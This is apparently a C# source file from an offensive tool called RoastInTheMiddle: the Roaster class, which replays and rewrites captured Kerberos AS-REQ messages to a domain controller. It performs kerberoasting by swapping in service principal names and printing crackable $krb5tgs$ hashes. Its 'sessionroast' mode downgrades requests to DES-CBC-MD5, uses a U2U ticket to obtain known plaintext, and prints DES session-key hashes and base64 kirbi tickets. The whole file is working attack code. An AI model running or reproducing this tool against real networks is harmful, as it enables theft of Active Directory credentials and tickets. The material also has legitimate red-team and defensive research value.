using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Asn1;
using RoastInTheMiddle.Lib.Krb;

namespace RoastInTheMiddle.Lib
{
    public class Roaster
    {
        private static IPAddress domainControllerIP { get; set; }

        private static Random rnd = new Random();

        private static byte[] knownPlainText { get; set; }

        public static void RitMRoaster()
        {
            int r = rnd.Next(((List<IPAddress>)Program.shared["dcs"]).Count);
            domainControllerIP = ((List<IPAddress>)Program.shared["dcs"])[r];

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   ROASTER: Using DC with IP {domainControllerIP} for roasting");
            }

            if (Program.command.Equals("sessionroast"))
            {
                knownPlainText = GetPlainText();
                if (knownPlainText == null)
                {
                    Console.WriteLine("[X] Unable to get a U2U ticket to retrieve the known plaintext, will be unable to generate crackable hashes");
                    Program.isRunning = false;
                    return;
                }
                else
                {
                    Console.WriteLine($"[*] Got usable known plain text: {Helpers.ByteArrayToString(knownPlainText)}");
                }
            }

            while (Program.isRunning && (((((List<string>)Program.shared["spns"]).Count > 0) && Program.command.Equals("kerberoast")) || !Program.command.Equals("kerberoast")))
            {
                if (Program.shared["captured"] != null)
                {
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[*]   ROASTER: Starting roast");
                    }
                    if (Program.command.Equals("kerberoast"))
                    {
                        PerformKerberoast();
                    }
                    else if (Program.command.Equals("sessionroast"))
                    {
                        PerformSessionroast();
                    }
                }
                else
                {
                    Thread.Sleep(100);
                }
            }
            if (Program.isRunning && Program.command.Equals("kerberoast"))
            {
                Console.WriteLine("[*] Tried all provided SPNs, roaster exiting...");
                Program.isRunning = false;
            }
            else
            {
                Console.WriteLine("[*] User forced close, roaster exiting...");
            }
        }

        private static void PerformKerberoast()
        {
            for (int i = ((List<string>)Program.shared["spns"]).Count - 1; i >= 0; i--)
            {
                string spn = ((List<string>)Program.shared["spns"])[i];
                AS_REQ asReq = (AS_REQ)Program.shared["captured"];
                asReq.req_body.sname.name_string = new List<string>();

                if (Program.verbose)
                {
                    Console.WriteLine($"[*]   ROASTER: Rewriting sname to {spn}");
                }

                foreach (var part in spn.Split('/'))
                {
                    asReq.req_body.sname.name_string.Add(part);
                }

                Interop.KERBEROS_ERROR response = Interop.KERBEROS_ERROR.UNKNOWN;
                try
                {
                    response = SendASREQ(asReq.Encode().Encode(), spn);
                }
                catch (Exception ex)
                {
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[!]   ROASTER: Unknown error occured: {ex.Message}\n{ex.StackTrace}\n\n");
                    }
                }
                if (response != Interop.KERBEROS_ERROR.UNKNOWN && response != Interop.KERBEROS_ERROR.KDC_ERR_NONE &&
                    response != Interop.KERBEROS_ERROR.KDC_ERR_S_PRINCIPAL_UNKNOWN && response != Interop.KERBEROS_ERROR.SUCCESS)
                {
                    Console.WriteLine($"[!] Error other than S_PRINCIPAL_UNKNOWN returned ({response}), waiting for new AS-REQ");
                    Program.shared["captured"] = null;
                    break;
                }
                else if (response == Interop.KERBEROS_ERROR.SUCCESS || response == Interop.KERBEROS_ERROR.KDC_ERR_S_PRINCIPAL_UNKNOWN)
                {
                    ((List<string>)Program.shared["spns"]).RemoveAt(i);
                }
            }
        }

        private static void PerformSessionroast()
        {
            AS_REQ asReq = (AS_REQ)Program.shared["captured"];
            asReq.req_body.etypes = new List<Interop.KERB_ETYPE>();

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   ROASTER: Modifying request supported etypes to only include DES-CBC-MD5");
            }

            asReq.req_body.etypes.Add(Interop.KERB_ETYPE.des_cbc_md5);

            Interop.KERBEROS_ERROR response = Interop.KERBEROS_ERROR.UNKNOWN;
            try
            {
                response = SendASREQ(asReq.Encode().Encode(), null, asReq);
            }
            catch (Exception ex)
            {
                if (Program.verbose)
                {
                    Console.WriteLine($"[!]   ROASTER: Unknown error occured: {ex.Message}\n{ex.StackTrace}\n\n");
                }
            }

            if (response == Interop.KERBEROS_ERROR.KDC_ERR_ETYPE_NOTSUPP)
            {
                Console.WriteLine($"[X]   ROASTER: Domain controller ({domainControllerIP}) does not support DES-CBC-MD5, exiting...");
                Program.isRunning = false;
                return;
            }

            Program.shared["captured"] = null;
        }

        public static Interop.KERBEROS_ERROR SendASREQ(byte[] asReqBytes, string spn = null, AS_REQ asReq = null)
        {
            var ret = Interop.KERBEROS_ERROR.UNKNOWN;

            byte[] responseRecord = SendBytes(asReqBytes);
            if (responseRecord != null)
            {
                AsnElt responseAsn;
                try
                {
                    responseAsn = AsnElt.Decode(responseRecord, false);

                }
                catch
                {
                    Console.WriteLine("[!]   ROASTER: Response from DC couldn't be decoded");
                    return ret;
                }

                int responseTag = responseAsn.TagValue;
                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
                {
                    AS_REP rep = new AS_REP(responseAsn);
                    ret = Interop.KERBEROS_ERROR.SUCCESS;

                    if (Program.command.Equals("kerberoast"))
                    {
                        PrintKerberoastHash(rep, spn);
                    }
                    else if (Program.command.Equals("sessionroast"))
                    {
                        PrintSessionroastHash(rep, asReq);
                    }
                }
                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    KRB_ERROR error = new KRB_ERROR(responseAsn);
                    ret = (Interop.KERBEROS_ERROR)error.error_code;
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[*] Got back error: {(Interop.KERBEROS_ERROR)error.error_code}");
                    }
                }
            }

            return ret;
        }

        private static byte[] SendBytes(byte[] data)
        {
            var ipEndPoint = new IPEndPoint(domainControllerIP, 88);
            var client = new TcpClient(ipEndPoint.AddressFamily);
            client.Client.Ttl = 128;
            client.Connect(ipEndPoint);

            if (Program.verbose)
            {
                Console.WriteLine($"[*]   ROASTER: Connected to {domainControllerIP}:88");
            }

            BinaryReader sr = new BinaryReader(client.GetStream());
            BinaryWriter sw = new BinaryWriter(client.GetStream());

            if (Program.verbose)
            {
                Console.WriteLine("[*]   ROASTER: Sending request to DC");
            }

            try
            {
                sw.Write(IPAddress.HostToNetworkOrder(data.Length));
                sw.Write(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X]   ROASTER: Error sending request to DC: {ex.Message}");
                return null;
            }

            int recordMark;
            try
            {
                recordMark = IPAddress.NetworkToHostOrder(sr.ReadInt32());
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[X]   ROASTER: Error reading record mark from DC: {ex.Message}");
                return null;
            }
            int recordSize = recordMark & 0x7fffffff;

            byte[] ret = null;
            if ((recordMark & 0x80000000) <= 0)
            {
                try
                {
                    ret = sr.ReadBytes(recordSize);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[X]   ROASTER: Error reading record from DC: {ex.Message}");
                    return null;
                }
            }

            client.Close();
            return ret;
        }

        private static void PrintKerberoastHash(AS_REP rep, string spn)
        {
            int encType = rep.ticket.enc_part.etype;
            string sname = string.Join("/", rep.ticket.sname.name_string);
            string cipherText = BitConverter.ToString(rep.ticket.enc_part.cipher).Replace("-", string.Empty);

            string hash;
            if ((encType == 18) || (encType == 17))
            {
                int checksumStart = cipherText.Length - 24;
                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, spn, rep.ticket.realm, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
            }
            else
            {
                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, "USER", rep.ticket.realm, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
            }

            Console.WriteLine($"[*] Hash for service {spn}:");
            Console.WriteLine(hash);
            Console.WriteLine($"{Environment.NewLine}");
        }

        private static void PrintSessionroastHash(AS_REP rep, AS_REQ asReq)
        {
            Ticket repTicket = rep.ticket;
            string clientUser = Program.tgt.enc_part.ticket_info[0].pname.name_string[0];
            string domain = Program.tgt.enc_part.ticket_info[0].prealm;
            Ticket tgt = Program.tgt.tickets[0];
            byte[] clientKey = Program.tgt.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)Program.tgt.enc_part.ticket_info[0].key.keytype;

            byte[] tgsBytes = TGS_REQ.NewTGSReq(clientUser, domain, asReq.req_body.cname.name_string[0], tgt, clientKey, paEType, repTicket);
            byte[] responseRecord = SendBytes(tgsBytes);

            if (responseRecord != null)
            {
                AsnElt responseAsn;
                try
                {
                    responseAsn = AsnElt.Decode(responseRecord);
                }
                catch
                {
                    Console.WriteLine("[!]   ROASTER: Response from DC couldn't be decoded for the U2U request");
                    return;
                }

                int responseTag = responseAsn.TagValue;
                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
                {
                    TGS_REP u2u = new TGS_REP(responseAsn);

                    Ticket u2uTicket = u2u.ticket;
                    Console.WriteLine($"[*] Hash DES session key:");
                    Console.WriteLine($"      {asReq.req_body.cname.name_string[0]} : {Crypto.FormDESHash(Helpers.ByteArrayToString(u2uTicket.enc_part.cipher), knownPlainText)}");

                    PrintKrbCred(asReq, rep);
                }
                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    KRB_ERROR error = new KRB_ERROR(responseAsn);
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[*] Got back error for the U2U request: {(Interop.KERBEROS_ERROR)error.error_code}");
                    }
                }
            }
        }

        private static void PrintKrbCred(AS_REQ asReq, AS_REP asRep)
        {
            KRB_CRED cred = new KRB_CRED();

            // add the ticket
            cred.tickets.Add(asRep.ticket);

            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

            KrbCredInfo info = new KrbCredInfo();

            // [1] prealm (domain)
            info.prealm = asRep.crealm;

            // [2] pname (user)
            info.pname.name_type = asRep.cname.name_type;
            info.pname.name_string = asRep.cname.name_string;

            // [8] srealm
            info.srealm = asRep.crealm;

            // [9] sname
            info.sname.name_type = asReq.req_body.sname.name_type;
            info.sname.name_string = asReq.req_body.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            string kirbiString = Convert.ToBase64String(kirbiBytes);

            Console.WriteLine($"[*] Kirbi missing session key:");
            if (Program.wrap)
            {
                // display the .kirbi base64, columns of 80 chararacters
                foreach (string line in Helpers.Split(kirbiString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else
            {
                Console.WriteLine("      {0}", kirbiString);
            }
            Console.WriteLine($"{Environment.NewLine}");
        }

        private static byte[] GetPlainText()
        {
            Ticket tgt = Program.tgt.tickets[0];
            string clientUser = Program.tgt.enc_part.ticket_info[0].pname.name_string[0];
            string domain = Program.tgt.enc_part.ticket_info[0].prealm;
            byte[] clientKey = Program.tgt.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)Program.tgt.enc_part.ticket_info[0].key.keytype;

            byte[] tgsBytes = TGS_REQ.NewTGSReq(clientUser, domain, clientUser, tgt, clientKey, paEType, tgt);
            byte[] responseRecord = SendBytes(tgsBytes);

            if (responseRecord != null)
            {
                AsnElt responseAsn;
                try
                {
                    responseAsn = AsnElt.Decode(responseRecord);
                }
                catch
                {
                    Console.WriteLine("[!]   ROASTER: Response from DC couldn't be decoded for the U2U request");
                    return null;
                }

                int responseTag = responseAsn.TagValue;
                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
                {
                    TGS_REP u2u = new TGS_REP(responseAsn);

                    Ticket u2uTicket = u2u.ticket;
                    var decryptedTicket = Crypto.KerberosDecrypt((Interop.KERB_ETYPE)u2uTicket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, clientKey, u2uTicket.enc_part.cipher);
                    string plainText = Helpers.ByteArrayToString(decryptedTicket).Substring(0, 16);
                    return Helpers.StringToByteArray(plainText);
                }
                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    KRB_ERROR error = new KRB_ERROR(responseAsn);
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[X] Got back error for the U2U request: {(Interop.KERBEROS_ERROR)error.error_code}");
                    }
                    return null;
                }
                else
                {
                    if (Program.verbose)
                    {
                        Console.WriteLine($"[X] Unable to decode response from DC!");
                    }
                    return null;
                }
            }

            return null;
        }
    }
}
